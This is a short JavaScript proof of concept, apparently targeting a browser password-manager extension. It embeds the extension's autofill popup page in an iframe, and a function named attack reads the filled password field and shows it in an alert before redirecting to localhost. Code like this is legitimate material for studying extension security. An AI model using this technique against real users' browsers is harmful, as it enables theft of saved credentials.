function attack() {
    var password = document.getElementById("password").value;
    alert("your password is: " + password);
    window.location.href = "https://localhost:8000/site"
}

function run() {
    var iframe = document.createElement("iframe");
    iframe.height = "10%";
    iframe.width = "100%";
    iframe.src = "chrome-extension://omkamdlakallckdjjcnglonboddelkmj/popupfilltab.html";
    document.body.appendChild(iframe);
}